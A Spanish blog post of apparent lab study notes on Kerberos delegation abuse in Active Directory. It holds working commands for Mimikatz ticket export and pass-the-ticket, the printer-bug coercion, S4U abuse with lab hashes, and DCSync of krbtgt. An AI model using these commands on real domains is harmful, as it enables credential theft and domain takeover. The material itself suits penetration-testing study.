---
layout: post
title: KERBEROS DELEGATION 
date: 19.03.2025
categories: [Active Directory, Windows, Kerberos, Authentication]
tag: [Windows, AD, Active Directory, Authentication Protocol, Delegation, Constrained Delegation, Unconstrained Delegation, RBCD, Resource Based Constrained Delegation, SSO, Single Sign On]
---

# ¿Que es KERBEROS?
Kerberos es el protocolo de auntentiación que utiliza Active Directory por defecto y permite características como Single Sign On (SSO).

![Imagen Kerberos](https://www.tarlogic.com/wp-content/uploads/2019/03/kerberosI-1200x900.png){width='75px'}



# KERBEROS DELEGATION

Esta es una característica que un Administrador de Dominio puede establecer en cualquier **Computadora** dentro del dominio. Luego, cada vez que un **usuario inicia sesión** en la Computadora, una **copia del TGT** de ese usuario será **enviada dentro del TGS** proporcionado por el DC **y guardada en memoria en LSASS**. Así que, si tienes privilegios de Administrador en la máquina, podrás **extraer los tickets e impersonar a los usuarios** en cualquier máquina.

Entonces, si un administrador de dominio inicia sesión en una Computadora con la característica de "Unconstrained Delegation" activada, y tú tienes privilegios de administrador local en esa máquina, podrás extraer el ticket e impersonar al Administrador de Dominio en cualquier lugar (privesc de dominio).

Puedes **encontrar objetos de Computadora con este atributo** verificando si el atributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx). Puedes hacer esto con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview.


```console
# Discover domain computers which have unconstrained delegation enabled using PowerView:
Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)

Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}


#########################################################################

# Enumerate users and computers with constrained delegation enabled

# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


#########################################################################

# RBCD ENUMERATION:
Get-DomainRBCD 

# We already have admin privileges on student VMs that are domain joined machines.

# Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}


# Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```


## UNCONSTRAINED DELEGATION


```console
################################################################################
############## UNCONSTRAINED DELEGATION - Privilege Escalation #################
################################################################################

# Discover domain computers which have unconstrained delegation enabled using PowerView:
Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)

Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}



# Compromise the server(s) where Unconstrained delegation is enabled.
# We must trick or wait for a domain admin to connect a service on appsrv.
# Now, if the command is run again:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# The DA token could be reused:
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'


###############################################################################
################## PRINTER BUG - Unconstrained Delegation #####################
###############################################################################

# We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
Rubeus.exe monitor /interval:5 /nowrap

# And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local


#Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
Rubeus.exe ptt /tikcet:

# Once the ticket is injected, run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


## CONSTRAINED DELEGATION


```console
################################################################################
################ CONSTRAINED DELEGATION - Privilege Escalation##################
################################################################################

# Enumerate users and computers with constrained delegation enabled

# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo



# Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv

# Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
'# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f'

# Using s4u from Kekeo, we request a TGS (steps 4 & 5):
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL



#Abusing with Kekeo
# Using mimikatz, inject the ticket:
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$



#Abusing with Rubeus

# We can use the following command (We are requesting a TGT and TGS in a single command):
C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$



# Abusing with Kekeo

# Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash

# Using asktgt from Kekeo, we request a TGT:
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67

# Using s4u from Kekeo_one (no SNAME validation):

tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL


# Abusing with Kekeo

# Using mimikatz:
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'


# Abusing with Rubeus

# We can use the following command (We are requesting a TGT and TGS in a single command):
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

# After injection, we can run DCSync:
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```


## RESOURCE BASED CONSTRAINED DELEGATION - RBCD


```console
# Create a new ACtive Directory computer object (ADModule).

# Example 1: Create a new computer account in an organization unit:
New-ADComputer -Name "USER02-SRV2" -SamAccountName "USER02-SRV2" -Path "OU=ApplicationServers,OU=ComputerAccounts,OU=Managed,DC=USER02,DC=COM"


# Example 2: Create a new computer account under an organization unit 
# in a specified region:
New-ADComputer -Name "USER01-SRV3" -SamAccountName "USER01-SRV3" -Path "OU=ApplicationServers,OU=ComputerAccounts,OU=Managed,DC=USER01,DC=COM" -Enabled $True -Location "Redmond,WA"


# Example 3: Create a new computer account from a template:
$TemplateComp = Get-ADComputer -Name "LabServer-00" -Properties "Location","OperatingSystem","OperatingSystemHotfix","OperatingSystemServicePack","OperatingSystemVersion" 
New-ADComputer -Instance $TemplateComp -Name "LabServer-01"
```
